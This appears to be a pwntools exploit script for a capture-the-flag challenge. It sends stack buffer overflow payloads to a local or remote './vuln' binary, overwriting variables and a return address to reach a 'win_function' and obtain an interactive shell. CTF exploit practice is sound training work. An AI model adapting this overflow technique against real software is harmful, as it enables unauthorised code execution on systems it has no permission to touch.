#!/usr/bin/python3
from pwn import *

context(terminal=['tmux', 'new-window'])

if args['REMOTE']: io = remote('battleground.ctf.scyca.org', 6000)
else: io = process('./vuln')

pad_500 = cyclic(500)

exploit_1 = pad_500[:50] + b"BBBB"
exploit_2 = pad_500[:50] + p32(0xCAFED00D)
exploit_3 = pad_500[:62] + p32(0x80491c6) #win_function

io.sendlineafter(b"eh?: ", exploit_1)
io.sendlineafter(b"time: ", exploit_2)
io.sendlineafter(b"shell?: ", exploit_3)
io.interactive()
